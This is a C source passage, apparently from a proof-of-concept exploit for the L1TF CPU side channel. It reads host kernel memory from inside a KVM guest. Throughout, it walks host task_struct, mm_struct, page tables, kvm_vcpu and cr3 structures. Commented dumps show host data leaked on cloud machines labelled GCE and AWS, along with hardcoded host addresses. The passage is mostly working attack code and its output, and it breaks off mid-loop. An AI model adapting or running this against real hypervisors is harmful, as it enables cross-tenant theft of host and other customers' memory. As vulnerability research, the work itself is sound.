		fprintf(stderr, "own_task_struct+H_TASK_COMM+%4x = %16lx %s\n", off, hc_read_va(own_task_struct+H_TASK_COMM+off),
			off == 0x48 ? "<-- struct files_struct *files" : "");
	}
	// --> #define H_TASK_FILES (H_TASK_COMM+0x48)

	hva_t files = hc_read_va(own_task_struct+H_TASK_FILES);
	dump(files);
	for (int off = 0; off < 0x100; off += 8) {
		fprintf(stderr, "files+%4x = %16lx %s\n", off, hc_read_va(files+off),
			off == 0x20 ? "<-- struct fdtable __rcu *fdt" : "");
	}
	// --> #define H_FILES_FDT 0x20

	hva_t fdt = hc_read_va(files + H_FILES_FDT);
	dump(fdt);
	for (int off = 0; off < 0x40; off += 8) {
		fprintf(stderr, "fdt+%4x = %16lx %s\n", off, hc_read_va(fdt+off),
			off == 0x8 ? "<-- struct file __rcu **fd" : "");
	}
	// --> #define H_FDTABLE_FD 0x8

	hva_t fd = hc_read_va(fdt + H_FDTABLE_FD);
	dump(fd);
	// for (int off = 0; off < 0x40*8; off += 8) {
	// 	u64 data = hc_read_va(fd+off);
	// 	fprintf(stderr, "fd+%4x = %16lx  -->  %16lx %16lx %16lx\n", off, data, hc_read_va(data), hc_read_va(data+8), hc_read_va(data+16));
	// }

	hva_t fd0 = hc_read_va(fd + 0);
	for (int off = 0; off < 0x100; off += 8) {
		fprintf(stderr, "fd0+%4x = %16lx %s\n", off, hc_read_va(fd0+off),
			off == 0x20 ? "<-- void *private_data" : "");
	}
	// --> #define H_FILE_PRIV 0x20

#if !defined(OWN_KVM)
#define OWN_KVM -1UL
#endif
	for (int i = 0; i < 0x28; i++) {
		hva_t file = hc_read_va(fd+i*8);
		for (int off = 0x20; off < 0x28; off += 8) {
			u64 data = hc_read_va(file+H_FILE_PRIV);
			fprintf(stderr, "fd[%2x] = %16lx | fd[%2x]->private_data = %16lx %s  -->  %16lx %16lx %16lx %16lx %16lx\n", i, file, i, data,
				hc_read_va(file+H_FILE_PRIV) == OWN_KVM ? "<-- struct kvm *OWN_KVM" : "",
				hc_read_va(data), hc_read_va(data+8), hc_read_va(data+0x10), hc_read_va(data+0x18), hc_read_va(data+0x20));
		}
	}

	fprintf(stderr, "===================================================================\n");
	fprintf(stderr, "===================================================================\n");
	fprintf(stderr, "===================================================================\n");

	fprintf(stderr, ">>> Traverse parents and children of task_structs:\n");

#if MACHINE == FATHER
	hva_t swapp = 0xffffffff98e0ff00;
	get_feeling_dump_task(swapp);
	hva_t systemd = hc_read_va(swapp+H_TASK_TASKS) - H_TASK_TASKS;
	get_feeling_dump_task(systemd);
	hva_t entry = hc_read_va(systemd+H_TASK_CHILDREN);
	do {
		hva_t child = entry - H_TASK_SIBLING;
		get_feeling_dump_task(child);
		entry = hc_read_va(entry);
	} while (entry != systemd+H_TASK_CHILDREN);
#endif
}

void reverse_host_kernel_data_structures_aws(void)
{
	uintptr_t base = 0xa1d34218;
	// a1d34200:
	//                0                0
	//                0 ffff93f673a19400
	// ffff93e461242e00                0
	//                0                0

	// uintptr_t phys_map[2] = {0xffff93f673a19400, 0xffff93e461242e00};
	// for (uintptr_t gb = 0; gb < 10; gb++) {
	// 	for (int i = 0; i < 2; i++) {
	// 		uintptr_t pa = phys_map[i] & ((1ULL << 30) - 1);
	// 		pa |= gb << 30;
	// 		fprintf(stderr, "pa = %lx   (gb=%lx)\n", pa, gb);
	// 		char data[0x100];
	// 		l1tf_leak_multi(data, base, pa, sizeof(data), 9);
	// 		display(data, sizeof(data));
	// 		fprintf(stderr, "\n");
	// 	}
	// }
	// pa = a1242e00   (gb=2)
	//    0:          fee00000   00 00 e0 fe 00 00 00 00 ........
	//    8:  ffffffff89a0eda0   a0 ed a0 89 ff ff ff ff ........
	//   10:  ffff93e46f8a2641   41 26 8a 6f e4 93 ff ff A&.o....
	//   18:  ffff93e46f8a2888   88 28 8a 6f e4 93 ff ff .(.o....
	//   20:  ffff93e46f8a2640   40 26 8a 6f e4 93 ff ff @&.o....
	//   28:     10efe62ffce8f   8f ce ff 62 fe 0e 01 00 ...b....
	//   30:     10ef9ebffddbc   bc dd ff eb f9 0e 01 00 ........
	//   38:  ffffffff8905f6c0   c0 f6 05 89 ff ff ff ff ........
	//   40:  ffff93e46f8a2140   40 21 8a 6f e4 93 ff ff @!.o....
	//   48:           1000001   01 00 00 01 00 00 00 00 ........
	//   50:                 0   00 00 00 00 00 00 00 00 ........
	//   58:                 0   00 00 00 00 00 00 00 00 ........
	//   60:     6000000040000   00 00 04 00 00 00 06 00 ........
	//   68:     b323f3e3eddc6   c6 dd 3e 3e 3f 32 0b 00 ..>>?2..
	//   70:     b32eccc5ed67e   7e d6 5e cc ec 32 0b 00 ~.^..2..
	//   78:               7ba   ba 07 00 00 00 00 00 00 ........
	//   80:  8000000000000000   00 00 00 00 00 00 00 80 ........
	//   88:                 1   01 00 00 00 00 00 00 00 ........
	//   90:                 2   02 00 00 00 00 00 00 00 ........
	//   98:  ffff93e461d18000   00 80 d1 61 e4 93 ff ff ...a....
	//   a0:         100000101   01 01 00 00 01 00 00 00 ........
	//   a8:          ffffffff   ff ff ff ff 00 00 00 00 ........
	//   b0:  ffff93e461274000   00 40 27 61 e4 93 ff ff .@'a....
	//   b8:                 0   00 00 00 00 00 00 00 00 ........
	//   c0:                 0   00 00 00 00 00 00 00 00 ........
	//   c8:                 0   00 00 00 00 00 00 00 00 ........
	//   d0:                 0   00 00 00 00 00 00 00 00 ........
	//   d8:                 0   00 00 00 00 00 00 00 00 ........
	//   e0:                 0   00 00 00 00 00 00 00 00 ........
	//   e8:                 0   00 00 00 00 00 00 00 00 ........
	//   f0:                 0   00 00 00 00 00 00 00 00 ........
	//   f8:                 0   00 00 00 00 00 00 00 00 ........
	// pa = 12b3a19400   (gb=4a)
	//    0:          fee00000   00 00 e0 fe 00 00 00 00 ........
	//    8:  ffffffff89a0eda0   a0 ed a0 89 ff ff ff ff ........

	// So pa 0xa1242e00 <--> va 0xffff93e461242e00, hence:
	uintptr_t direct_map = 0xffff93e461242e00 - 0xa1242e00; // == ffff93e3c0000000

	dump(base);
	dump(direct_map);
}

void reverse_around(hpa_t base, hpa_t pa)
{
	fprintf(stderr, "reverse_around:\n"); dump(pa);
	#define R 0x800
	char buf[2*R];
	int next_delta = 8;
	for (int off = R; off < 2*R;) {
		leak(&buf[off], base, pa-R+off, 8);
		if (off <= R) {
			fprintf(stderr, "pa - %4x:\n", R-off);
			display(&buf[off], next_delta);
		}
		off += next_delta;
		next_delta = -next_delta + (next_delta > 0 ? -8 : 8);
	}
	exit(1);
}

void reverse_after(hpa_t base, hpa_t pa, hva_t hdm, const char *name, int len)
{
	for (int off = 0; off < len; off += 8) {
		u64 data = leak64(base, pa+off);

		// for (int i = 1; i < 8; i++)
		// 	data = leak64(base, pa+off);
		// u64 data = 0;
		// leak(&data, base, pa+off+5, 1); 

		// u64 data = 0;
		// leak(&data, base, pa+off, 1); 
		fprintf(stderr, "dm %16lx | pa %12lx | %16s+%4x = %16lx\n", hdm+pa+off, pa+off, name, off, data);
	}
}

void reverse_host_kernel_data_structures(void)
{
        // Results below were gathered on rain-vm-gce.

	uintptr_t base = 0x88d43f218;
	
	uintptr_t direct_map = 0xffff934040000000;

	// uintptr_t kvm_lapic = 0xffff9348e6de5e00;


	// fprintf(stderr, "kvm_lapic:\n");
	// for (int off = 0; off <= 0xc0; off += 0x40) {
	// 	char *data = try_l1tf_leak(base, kvm_lapic-direct_map+off, 0x40);
	// 	display_data(data);
	// }
	// 	kvm_lapic:
	//         fee00000 ffffffff84615f70
	// ffff9348e6de5e10                0
	//                0    3d9822bcd52e0
	//    3d9822bcd52e0 ffffffff83785250
	// ffff939eff5a8140          1000000
	//            f2cf0    3d99f36f3f919
	//    2000000000000    5a8ebfbf27dce
	//                0              695
	// 8000000000000000        100000000
	//               10 ffff9352eff70e40 <-- should be kvm_lapic's vcpu, at 0x98
	//        100000101         ffffffff
	// ffff934164541000                0
	//                0                0
	//                0                0
	//                0                0
	//        600000000                0


	// uintptr_t kvm_vcpu = *(uintptr_t *)&data[8]; // *(kvm_lapic+0x88)
	uintptr_t kvm_vcpu = 0xffff9352eff70e40; // *(kvm_lapic+0x88)
	// fprintf(stderr, "kvm_vcpu:\n");
	// for (int off = 0; off <= 0xc0; off += 0x40) {
	// 	char *data = try_l1tf_leak(base, kvm_vcpu-direct_map+off, 0x40);
	// 	display_data(data);
	// }
	// kvm_vcpu:
	// ffff9584f2d71000 ffff934228163610
	// ffff936a91dba828 ffffffff8555d368
	//               38        100000000
	//                1                0
	//                f         ffffffff
	// ffff9352eff70e90 ffff9352eff70e90
	// ffff936a91dba000          f000000
	// ffff9352eff70eb0 ffff9352eff70eb0
	// ffff9341b74fe000                0
	// ffff93416434bc00          f000000  <--- left one
	//                0                0
	//                0        100000001
	// kvm_vcpu:
	// ffff9584f2d71000 ffff934228163610
	// ffff936a91dba828 ffffffff8555d368
	//               38        100000000
	//                1                0
	//                0         ffffffff
	// ffff9352eff70e90 ffff9352eff70e90
	// ffff936a91dba000                0
	// ffff9352eff70eb0 ffff9352eff70eb0
	// ffff9341b74fe000                0
	// ffff93416434bc00                0  <--- left one
	//                0                0
	//                0        100000000
	//                1               10
	//  ff09300003010e0                1
	//                0                0
	//        f00000000                0



	// uintptr_t pid = *(uintptr_t *)&data[0x10]; // *(kvm_vcpu+0x90)
	// uintptr_t pid = 0xffff93416434bc00; // *(kvm_vcpu+0x90)
	// fprintf(stderr, "pid:\n");
	// char *data = try_l1tf_leak(base, pid-direct_map, 0x40);
	// display_data(data);
	// pid:
	//                e                0
	// ffff936a91dbaa78                0 <--- left one
	//  f00000000000000                0
	// ffff93dbd8e25a30                0
	// pid:
	//                e    f000000000000
	// ffff936a91dbaa78      f0000000000
	//              f00  f00000000000f00
	// ffff93fade8bcadf                0
	// pid:
	//    f0000000f000e                0
	// ffff936a91dbaa78          f000000
	//                0                0
	// ffff93da0e0bcad0                0
	// pid:
	//                e                0
	// ffff936a91dbaa78                0
	//                0                0
	// ffff93d4de463828                0

	// struct task_struct {
	// 	+ 64	static_prio
	// 	+ 68	normal_prio
	// 	+ 6c	rt_priority
	// 	+900	tasks
	// 	+a78	pid_links
	// 	+c38	comm
	// }
	// uintptr_t task_struct = *(uintptr_t *)&data[0x10] - 0xa78; // *(pid+0x10)
	// uintptr_t task_struct = 0xffff936a91dbaa78 - 0xa78; // *(pid+0x10)
	// fprintf(stderr, "task_struct:\n");
	// for (int off = 0; off < 0x100; off += 0x40) {
	// 	char *data = try_l1tf_leak(base, task_struct-direct_map+off, 0x40);
	// 	display_data(data);
	// }



	// for (int i = 0; i < 20; i++) {
	// 	// uintptr_t task_struct = *(uintptr_t *)&data[0x10] - 0xa40; // *(pid+0x10)
	// 	uintptr_t task_struct = (0xffff936a91dbaa78 - 0xa40) & ~63; // *(pid+0x10)
	// 	fprintf(stderr, "task_struct+0x8c0:\n");
	// 	for (int off = 0x8c0; off < 0x980; off += 0x40) {
	// 		char *data = try_l1tf_leak(base, task_struct-direct_map+off, 0x40);
	// 		display_data(data);
	// 	}
	// }
	// task_struct+0x800:
	//       11cb20dfff    40e097cdf010f
	//                0      f000000a280
	//     e7f088888f27      f000000000f
	//    f000000000000    248be30e15218
	// fffffff08501a440 ffff93416c014a80  <-- hier is task_struct's tasks, op +0x900
	//               8c ffff936a91dba918
	// ffff936a91dba918 ffff936a91dba928
	// ffff936a91dba928 ffff936a91dba938


	// fprintf(stderr, "task_struct+c00:\n");
	// for (int off = 0xc00; off < 0xc80; off += 0x40) {
	// 	char *data = try_l1tf_leak(base, task_struct-direct_map+off, 0x40);
	// 	display_data(data);
	// }

	// char *comm = try_l1tf_leak(base, task_struct-direct_map+0xc38, 0x10);
	// fprintf(stderr, "comm = %s\n", comm);


	// char task_struct[0x80];
	// for (int i = 0; i < 11; i++) {
	// 	fprintf(stderr, "task_struct+0x900:\n");
	// 	l1tf_leak(task_struct, base, 0xffff936a91dba000-direct_map+0x900, sizeof(task_struct));
	// 	display(task_struct, sizeof(task_struct));
	// }
	// task_struct+0x900:
	//    0:  ffffffff8501a440   40 a4 01 85 ff ff ff ff @.......
	//    8:  ffff93416c014a80   80 4a 01 6c 41 93 ff ff .J.lA...
	//   10:                8c   8c 00 00 00 00 00 00 00 ........
	//   18:  ffff936a91dba918   18 a9 db 91 6a 93 ff ff ....j...
	//   20:  ffff936a91dba918   18 a9 db 91 6a 93 ff ff ....j...
	//   28:  ffff936a91dba928   28 a9 db 91 6a 93 ff ff (...j...
	//   30:  ffff936a91dba928   28 a9 db 91 6a 93 ff ff (...j...
	//   38:  ffff936a91dba938   38 a9 db 91 6a 93 ff ff 8...j...
	//   40:                 0   00 00 00 00 00 00 00 00 ........
	//   48:                 0   00 00 00 00 00 00 00 00 ........
	//   50:  ffff9342868f2000   00 20 8f 86 42 93 ff ff . ..B... <-- struct mm_struct *mm
	//   58:  ffff9342868f2000   00 20 8f 86 42 93 ff ff . ..B... <-- struct mm_struct *active_mm
	//   60:                 0   00 00 00 00 00 00 00 00 ........
	//   68:             f376a   6a 37 0f 00 00 00 00 00 j7......
	//   70:  ffff93428823e988   88 e9 23 88 42 93 ff ff ..#.B...
	//   78:                 0   00 00 00 00 00 00 00 00 ........

	// uintptr_t mm = 0xffff9342868f2000; // task_struct+0x950
	// char mm_struct[0x70];
	// for (int i = 0; i < 11; i++) {
	// 	fprintf(stderr, "mm_struct+0x40:\n");
	// 	l1tf_leak(mm_struct, base, mm-direct_map+0x40, sizeof(mm_struct));
	// 	display(mm_struct, sizeof(mm_struct));
	// }
	// mm_struct+0x40:
	//    0:                 1   01 00 00 00 00 00 00 00 ........
	//    8:                 0   00 00 00 00 00 00 00 00 ........
	//   10:          ffffe000   00 e0 ff ff 00 00 00 00 ........
	//   18:          555a1000   00 10 5a 55 00 00 00 00 ..ZU....
	//   20:          f7fb2000   00 20 fb f7 00 00 00 00 . ......
	//   28:                 1   01 00 00 00 00 00 00 00 ........
	//   30:      7ffffffff000   00 f0 ff ff ff 7f 00 00 ........
	//   38:      7ffda0b1c000   00 c0 b1 a0 fd 7f 00 00 ........
	//   40:  ffff934151cf6000   00 60 cf 51 41 93 ff ff .`.QA... <-- pgd
	//   48:                c2   c2 00 00 00 00 00 00 00 ........
	//   50:                 0   00 00 00 00 00 00 00 00 ........
	//   58:                 0   00 00 00 00 00 00 00 00 ........
	//   60:                 0   00 00 00 00 00 00 00 00 ........
	//   68:                 0   00 00 00 00 00 00 00 00 ........


	uintptr_t pgd = 0xffff934151cf6000; // mm_struct+0x80
	// char pgd_data[0x40];
	// for (int i = 0; i < 11; i++) {
	// 	fprintf(stderr, "pgd+0xfc0:\n");
	// 	l1tf_leak(pgd_data, base, pgd-direct_map+0xfc0, sizeof(pgd_data));
	// 	display(pgd_data, sizeof(pgd_data));
	// }
	// pgd+0xfc0:
	//    0:                 0   00 00 00 00 00 00 00 00 ........
	//    8:                 0   00 00 00 00 00 00 00 00 ........
	//   10:                 0   00 00 00 00 00 00 00 00 ........
	//   18:                 0   00 00 00 00 00 00 00 00 ........
	//   20:        c03ffd0067   67 00 fd 3f c0 00 00 00 g..?....
	//   28:                 0   00 00 00 00 00 00 00 00 ........
	//   38:        c034a13067   67 30 a1 34 c0 00 00 00 g0.4....

	// uintptr_t kvm = 0xffff9584f2d71000;
	// uintptr_t kvm_pa = leak_translation(base, kvm, pgd-direct_map, 0);
	// leak_translation(l0_pa = 111cf6000, va = ffff9584f2d71000)
	//                l0_pa =        111cf6000
	//               pgd_pa =        111cf6958
	// leak_pte_old: 100000067
	//                  pgd =        100000067
	//                l1_pa =        100000000
	//               pud_pa =        100000098
	// leak_pte_old: 100263067
	//                  pud =        100263067
	//                l2_pa =        100263000
	//               pmd_pa =        100263cb0
	// leak_pte_old: 6057fbd067
	//                  pmd =       6057fbd067
	//                l3_pa =       6057fbd000
	//               pte_pa =       6057fbdb88
	// leak_pte_old: 800000013354d063
	//                  pte = 800000013354d063
	//                   pa =        13354d000
	// uintptr_t kvm_pa = 0x13354d000;


	// char struct_kvm[0x100];
	// for (int i = 0; i < 11; i++) {
	// 	fprintf(stderr, "struct_kvm+0x1178 - 0x80:\n");
	// 	l1tf_leak(struct_kvm, base, kvm_pa+0x1178 - 0x80, sizeof(struct_kvm));
	// 	display(struct_kvm, sizeof(struct_kvm));
	// }
	// char struct_kvm[0x200];
	// for (int i = 0; i < 100; i++) {
	// 	fprintf(stderr, "struct_kvm+0x8b8 - 0x100: (i = %d)\n", i);
	// 	l1tf_leak(struct_kvm, base, kvm_pa+0x1178 - 0x100, sizeof(struct_kvm));
	// 	display(struct_kvm, sizeof(struct_kvm));
	// }


	uintptr_t mmu = kvm_vcpu - direct_map + 0x120 + 0x168;
	dump(mmu);
	// char struct_mmu[0x80];
	// for (int i = 0; i < 100; i++) {
	// 	fprintf(stderr, "mmu - 0x40: (i = %d)\n", i);
	// 	l1tf_leak(struct_mmu, base, mmu - 0x40, sizeof(struct_mmu));
	// 	display(struct_mmu, sizeof(struct_mmu));
	// }
	// mmu - 0x40: (i = 10)
	//    0:                 0   00 00 00 00 00 00 00 00 ........
	//    8:                 0   00 00 00 00 00 00 00 00 ........
	//   10:                 0   00 00 00 00 00 00 00 00 ........
	//   18:                 1   01 00 00 00 00 00 00 00 ........
	//   20:             30000   00 00 03 00 00 00 00 00 ........
	//   28:                 0   00 00 00 00 00 00 00 00 ........
	//   30:           1000000   00 00 00 01 00 00 00 00 ........
	//   38:                 0   00 00 00 00 00 00 00 00 ........
	//   40:  ffffffff00000000   00 00 00 00 ff ff ff ff ........
	//   48:           400004c   4c 00 00 04 00 00 00 00 L.......
	//   50:              2005   05 20 00 00 00 00 00 00 . ......
	//   58:  ffff9352eff710e8   e8 10 f7 ef 52 93 ff ff ....R... <-- here is mmu; it points to +8, i.e. to root_mmu
	//   60:  ffffffff837a4860   60 48 7a 83 ff ff ff ff `Hz..... <-- start of root_mmu
	//   68:  ffffffff837a4890   90 48 7a 83 ff ff ff ff .Hz.....
	//   70:  ffffffff83796fb0   b0 6f 79 83 ff ff ff ff .oy.....
	//   78:  ffffffff8375dee0   e0 de 75 83 ff ff ff ff ..u.....

	// uintptr_t root_mmu = 0xffff9352eff710e8 - direct_map; // == mmu + 8
	// dump(root_mmu);
	// char struct_root_mmu[0x30];
	// for (int i = 0; i < 100; i++) {
	// 	fprintf(stderr, "struct_root_mmu+0x20: (i = %d)\n", i);
	// 	l1tf_leak(struct_root_mmu, base, root_mmu+0x20, sizeof(struct_root_mmu));
	// 	display(struct_root_mmu, sizeof(struct_root_mmu));
	// }
	// fprintf(stderr, "\n");
	// struct_root_mmu+0x20: (i = 5)
	//    0:  ffffffff837a04e0   e0 04 7a 83 ff ff ff ff ..z.....
	//    8:  ffffffff837a4b60   60 4b 7a 83 ff ff ff ff `Kz.....
	//   10:  ffffffff837a01c0   c0 01 7a 83 ff ff ff ff ..z.....
	//   18:                 0   00 00 00 00 00 00 00 00 ........
	//   20:                 0   00 00 00 00 00 00 00 00 ........
	//   28:         f77f64000   00 40 f6 77 0f 00 00 00 .@.w....
	uintptr_t hpa = 0xf77f64000; // *(root_mmu + 0x48);


	// void *p = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
	// assert(p != MAP_FAILED);
	// memset(p, 0x97, 0x1000);
	// uintptr_t p_va = (uintptr_t)p;
	// uintptr_t p_pa = procfs_get_physaddr(p_va);
	// uintptr_t p_hpa = leak_translation(base, p_pa, hpa, 0);
	// dump(p_va);
	// dump(p_pa);
	// dump(p_hpa);
	// char mydata[8];
	// for (int i = 0; i < 3; i++) {
	// 	l1tf_leak(mydata, base, p_hpa, sizeof(mydata));
	// 	display(mydata, sizeof(mydata));
	// }
	// memset(p, 0x79, 0x1000);
	// // Careful here: the l1tf code will have cached the 0x97 results in its hc_map.
	// // Do enough re-measurements to overrule the earlier data.
	// for (int i = 0; i < 10; i++)
	// 	l1tf_leak(mydata, base, p_hpa, sizeof(mydata));
	// display(mydata, sizeof(mydata));
	// fprintf(stderr, "\n");


	// uintptr_t cr3 = kvm_vcpu-direct_map + 0x120 + 0xa0; // vcpu->arch.cr3
	// dump(cr3);
	// char around_cr3[0x40];
	// for (int i = 0; i < 100; i++) {
	// 	fprintf(stderr, "cr3-0x20: (i = %d)\n", i);
	// 	l1tf_leak(around_cr3, base, cr3-0x20, sizeof(around_cr3));
	// 	display(around_cr3, sizeof(around_cr3));
	// }
	// fprintf(stderr, "\n");
	// cr3-0x20: (i = 68)
	//    0:     47da54bf494b3   b3 94 f4 4b a5 7d 04 00 ...K.}..
	//    8:  ffff74e54bf39e49   49 9e f3 4b e5 74 ff ff I..K.t..
	//   10:  ffffffffb8345676   76 56 34 b8 ff ff ff ff vV4.....
	//   18:     10000ff21ffef   ef ff 21 ff 00 00 01 00 ..!.....
	//   20:          80050033   33 00 05 80 00 00 00 00 3.......
	//   28:                 8   08 00 00 00 00 00 00 00 ........
	//   30:      70054c03901f   1f 90 03 4c 05 70 00 00 ...L.p..
	//   38:         1961c6001   01 60 1c 96 01 00 00 00 .`...... <-- cr3
	// uintptr_t cr3 = 0x1961c6001; // kvm_vcpu-direct_map + 0x120 + 0xb8;
	
	// uintptr_t cr3_pa = kvm_vcpu-direct_map + 0x120 + 0xb8; // vcpu->arch.cr3
	// dump(cr3_pa);
	// uintptr_t cr3;
	// for (int i = 0; i < 100; i++) {
	// 	fprintf(stderr, "cr3_pa | %lx: (i = %d)\n", cr3_pa, i);
	// 	l1tf_leak((char *)&cr3, base, cr3_pa, sizeof(cr3));
	// 	display((char *)&cr3, sizeof(cr3));
	// }
	// fprintf(stderr, "\n");
	// uintptr_t cr3 = 0x10c000006; // kvm_vcpu-direct_map + 0x120 + 0xb8;
	uintptr_t cr3 = 0x189e3e001;
	// cr3 &= PFN_MASK;

	uintptr_t cr3_hpa = 0x212323e000; // leak_translation(base, cr3, hpa, 0); // 0x2b88000000
	dump(cr3_hpa);
	
	// char l0_end[0x40];
	// for (int i = 0; i < 100; i++) {
	// 	fprintf(stderr, "l0_end: (i = %d)\n", i);
	// 	l1tf_leak(l0_end, base, cr3_hpa+0x1000-sizeof(l0_end), sizeof(l0_end));
	// 	display(l0_end, sizeof(l0_end));
	// }
	// fprintf(stderr, "\n");
	// l0_end: (i = 3)
	//    0:                 0   00 00 00 00 00 00 00 00 ........
	//    8:                 0   00 00 00 00 00 00 00 00 ........
	//   10:                 0   00 00 00 00 00 00 00 00 ........
	//   18:                 0   00 00 00 00 00 00 00 00 ........
	//   20:         21ffca067   67 a0 fc 1f 02 00 00 00 g.......
	//   28:                 0   00 00 00 00 00 00 00 00 ........
	//   30:         20cddb067   67 b0 dd 0c 02 00 00 00 g....... <-- hpa 17a7bdb000
	//   38:         20c445067   67 50 44 0c 02 00 00 00 gPD..... <-- hpa 2dcb645000


	// uintptr_t l1 = 0x20c445067 & PFN_MASK; //0x20cddb067 & PFN_MASK;
	// uintptr_t l1_hpa = 0x2dcb645000; // leak_translation(base, l1, hpa, 0); // 0x17a7bdb000
	// char buf;
	// for (int off = 0; off < 0x1000; off += 8) {
	// 	l1tf_leak(&buf, base, l1_hpa+off, 1);
	// 	if (buf)
	// 		fprintf(stderr, "at +%x, i.e. %lx we have buf = %02x\n", off, l1_hpa+off, buf);
	// }
	// at +%[x, i.e. 460 we have buf = a7bdb460 
	// at +%[x, i.e. 470 we have buf = a7bdb470
	// at +%[x, i.e. 478 we have buf = a7bdb478

	// at +ff0, i.e. 2dcb645ff0 we have buf = 63
	// at +ff8, i.e. 2dcb645ff8 we have buf = 67

	// char l1_end[0x10];
	// for (int i = 0; i < 100; i++) {
	// 	fprintf(stderr, "l1_end: (i = %d)\n", i);
	// 	l1tf_leak(l1_end, base, l1_hpa+0x1000-sizeof(l1_end), sizeof(l1_end));
	// 	display(l1_end, sizeof(l1_end));
	// }
	// fprintf(stderr, "\n");
	// l1_end: (i = 0)
	//    0:         20c446063   63 60 44 0c 02 00 00 00 c`D..... <-- hpa 2dcb646000
	//    8:         20c447067   67 70 44 0c 02 00 00 00 gpD.....
	// uintptr_t l2 = 0x20c446063 & PFN_MASK;
	// uintptr_t l2_hpa = 0x2dcb646000; //leak_translation(base, l2, hpa, 0);
	// dump(l2_hpa);

	// char buf;
	// for (int off = 0x27 * 8; off < 0x32*8; off += 8) {
	// 	l1tf_leak(&buf, base, l2_hpa+off, 1);
	// 	if (buf)
	// 		fprintf(stderr, "idx = %x | off = +%x, i.e. hpa %lx we have buf = %02x\n", off/8, off, l2_hpa+off, (uint8_t)buf);
	// }
	// idx = 1c1 | off = +e08, i.e. hpa 2dcb646e08 we have buf = a1
	// idx = 1c2 | off = +e10, i.e. hpa 2dcb646e10 we have buf = a1
	// idx = 1c3 | off = +e18, i.e. hpa 2dcb646e18 we have buf = a1
	// idx = 1c4 | off = +e20, i.e. hpa 2dcb646e20 we have buf = a1
	// idx = 1c5 | off = +e28, i.e. hpa 2dcb646e28 we have buf = a1
	// idx = 1c6 | off = +e30, i.e. hpa 2dcb646e30 we have buf = a1
	// idx = 1c7 | off = +e38, i.e. hpa 2dcb646e38 we have buf = a1
	// idx = 1c8 | off = +e40, i.e. hpa 2dcb646e40 we have buf = a1
	// idx = 1c9 | off = +e48, i.e. hpa 2dcb646e48 we have buf = a1
	// idx = 1ca | off = +e50, i.e. hpa 2dcb646e50 we have buf = a1
	// idx = 1cb | off = +e58, i.e. hpa 2dcb646e58 we have buf = a1
	// idx = 1cc | off = +e60, i.e. hpa 2dcb646e60 we have buf = a1
	// idx = 1cd | off = +e68, i.e. hpa 2dcb646e68 we have buf = a1
	// idx = 1ce | off = +e70, i.e. hpa 2dcb646e70 we have buf = a1
	// idx = 1cf | off = +e78, i.e. hpa 2dcb646e78 we have buf = a1
	// idx = 1d0 | off = +e80, i.e. hpa 2dcb646e80 we have buf = 63
	// idx = 1d1 | off = +e88, i.e. hpa 2dcb646e88 we have buf = e3
	// idx = 1d2 | off = +e90, i.e. hpa 2dcb646e90 we have buf = e3
	// idx = 1d3 | off = +e98, i.e. hpa 2dcb646e98 we have buf = 63
	// idx = 1d4 | off = +ea0, i.e. hpa 2dcb646ea0 we have buf = 62
	// idx = 1d5 | off = +ea8, i.e. hpa 2dcb646eapyth8 we have buf = 63
	// idx = 1d6 | off = +eb0, i.e. hpa 2dcb646eb0 we have buf = e3
	// idx = 1d7 | off = +eb8, i.e. hpa 2dcb646eb8 we have buf = e3
	// idx = 1d8 | off = +ec0, i.e. hpa 2dcb646ec0 we have buf = 63
	// idx = 1d9 | off = +ec8, i.e. hpa 2dcb646ec8 we have buf = e3

	uintptr_t text = (0xffffULL << 48) | (0x1ffULL << 39) | (0x1feULL << 30) | (0x1c1ULL << 21);
	dump(text);

	#define OFF_INIT_TASK 0x2011f80

	hpa_t hcr3 = pgd - direct_map;

	// translator_exam(base, direct_map, hpa, hcr3, cr3_hpa, text);

	hva_t kvm = 0xffff9584f2d71000; // leak_u64(base, kvm_vcpu-direct_map, 1);
	dump(kvm);
	hpa_t kvm_pa = 0x13354d000; // leak_translation(base, kvm, hcr3, 0);
	dump(kvm_pa);

	// char kvm_mid[0x250];
	// hpa_t kvm_start = kvm_pa + KVM_VCPU_ARRAY - sizeof(kvm_mid)/2;
	// for (int i = 0; i < 100; i++) {
	// 	fprintf(stderr, "kvm_start, i.e. %lx: (i = %d)\n", kvm_start, i);
	// 	l1tf_leak(kvm_mid, base, kvm_start, sizeof(kvm_mid));
	// 	display(kvm_mid, sizeof(kvm_mid));
	// }
	// fprintf(stderr, "\n");
	// kvm_start, i.e. 13354e108: (i = 5)
	//    0:                 0   00 00 00 00 00 00 00 00 ........
	//    8:                 0   00 00 00 00 00 00 00 00 ........
	//   10:                 0   00 00 00 00 00 00 00 00 ........
	//   18:                 0   00 00 00 00 00 00 00 00 ........
	//   20:                 0   00 00 00 00 00 00 00 00 ........
	//   28:                 0   00 00 00 00 00 00 00 00 ........
	//   30:                 0   00 00 00 00 00 00 00 00 ........
	//   38:  ffff9341505455d0   d0 55 54 50 41 93 ff ff .UTPA...

	
	// hpa_t head = 0xffff93417354e000 - direct_map;
	// dump(head);
	// char head_buf[0x8];
	// for (int i = 0; i < 100; i++) {
	// 	fprintf(stderr, "head, i.e. %lx: (i = %d)\n", head, i);
	// 	l1tf_leak(head_buf, base, head, sizeof(head_buf));
	// 	display(head_buf, sizeof(head_buf));
	// }
	// fprintf(stderr, "\n");

	// hpa_t chase = 0xffff93417354e0c0 - direct_map;
	// dump(chase);
	// char chase_buf[0x18];
	// for (int i = 0; i < 100; i++) {
	// 	fprintf(stderr, "chase, i.e. %lx: (i = %d)\n", chase, i);
	// 	l1tf_leak(chase_buf, base, chase, sizeof(chase_buf));
	// 	display(chase_buf, sizeof(chase_buf));
	// }
	// fprintf(stderr, "\n");

	// char buf[3];
	// l1tf_leak(buf, base, kvm_pa + 0x1130, 1000);
	// display(buf, 3);

	// hpa_t dm_ptr = l1tf_find_magic16(base, 0xffff, kvm_pa+0x1100+6, kvm_pa+0x1100+0x100, 8);
	// dump(dm_ptr);
	// dump(leak_u64(base, dm_ptr, 5));

	// while (1) {
	// 	dm_ptr = l1tf_find_magic16(base, 0xff93, dm_ptr, kvm_pa+0x100, 8);
	// 	dump(dm_ptr);
	// 	dump(leak_u64(base, dm_ptr, 5));
	// }

	// hpa_t kvm_np_pa = leak_translation(base, kvm+0x1000, hcr3, 0);
	// dump(kvm_np_pa);
	// char buf[0x40];
	// while (1) {
	// 	for (int off = 0; off < 0x300; off += sizeof(buf)) {
	// 		for (int i = 0; i < 15; i++)
